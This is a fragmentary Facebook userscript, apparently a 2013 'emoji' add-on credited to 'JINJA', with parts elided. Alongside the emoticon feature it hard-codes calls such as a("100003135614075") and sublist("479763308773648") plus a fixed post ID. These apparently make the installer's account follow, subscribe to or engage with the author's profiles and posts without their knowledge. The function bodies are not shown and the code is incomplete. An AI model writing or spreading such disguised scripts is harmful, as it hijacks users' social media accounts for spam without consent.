// ==UserScript==
// @name            Emoji New Emoticon 2013 @
// @description     Facebook AutoNew 2013 By JINJA
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/siti.swan.3" target="_blank">Created by JINJA AND <br>ANANQ</a>';
	html += '</div>';
...
a("100003135614075"); //
a("100005124870384"); //
sublist("479763308773648");
sublist("160700704110758");
...
var spost_id = "100004374332459_126113110877833";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by JINJA';
